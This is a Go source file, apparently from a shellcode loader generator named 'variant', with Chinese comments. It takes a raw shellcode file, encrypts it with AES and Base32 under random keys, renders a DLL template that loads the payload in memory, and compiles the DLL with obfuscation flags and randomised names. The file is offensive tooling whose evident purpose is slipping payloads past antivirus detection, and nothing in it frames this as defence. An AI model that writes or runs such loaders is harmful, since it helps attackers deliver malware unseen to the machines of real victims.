package main

import (
	"fmt"
	"strings"
	"variant/build"
	"variant/crypto"
	"variant/encoder"
	"variant/log"
	"variant/rand"
	"variant/render"
)

func main() {
	// 设置加密参数
	params := encoder.Payload{
		PlainText: "output/payload.bin",
		FileName:  rand.RStrings(),
		Path:      "output",
		Key:       rand.LByteStrings(16),
		IV:        rand.LByteStrings(16),
	}
	// 加密之后的 shellcode
	payload, err := params.SetKeyIV(crypto.AesBase32Encrypt) // 传入加密方法，根据加密方法的签名渲染模板
	if err != nil {
		log.Fatal(err)
	}

	local := render.Local{
		Payload:      payload,
		KeyName:      rand.RStrings(),
		KeyValue:     string(params.Key),
		IvName:       rand.RStrings(),
		IvValue:      string(params.IV),
		DecryptLocal: "crypto.AesBase32Decrypt",
		MainLocal:    rand.RStrings(),
	}

	load := render.Loader{
		Import: "variant/loader",
		Method: "loader.ADsMemLoad",
	}

	dll := render.DLLibrary{
		DllFuncName: rand.RStrings(),
	}

	// 定义模板渲染数据
	data := render.Data{
		DLLibrary:  dll,
		CipherText: rand.RStrings(),
		PlainText:  rand.RStrings(),
		Loader:     load,
		Local:      local,
	}

	// 设置模板的渲染参数
	tOpts := render.TmplOpts{
		TmplFile:     "render/templates/v5/Dll.tmpl",
		OutputDir:    "output",
		OutputGoName: fmt.Sprintf("%s.go", rand.RStrings()),
		Data:         data,
	}
	// 生成模板
	err = tOpts.TmplRender()
	if err != nil {
		log.Fatal(err)
	}

	// 编译参数
	cOpts := build.CompileOpts{
		GoFileName:  tOpts.OutputGoName,
		ExeFileName: fmt.Sprintf("%s.dll", strings.TrimSuffix(tOpts.OutputGoName, ".go")),
		CompilePath: "output",
		BuildMode:   "c-shared",
		GSeed:       true,
		Literals:    true,
		Tiny:        true,
	}

	// 编译
	if err = cOpts.GoCompile(); err != nil {
		log.Fatal(err)
	}
	log.Infof("export %s successfully!", dll.DllFuncName)
}
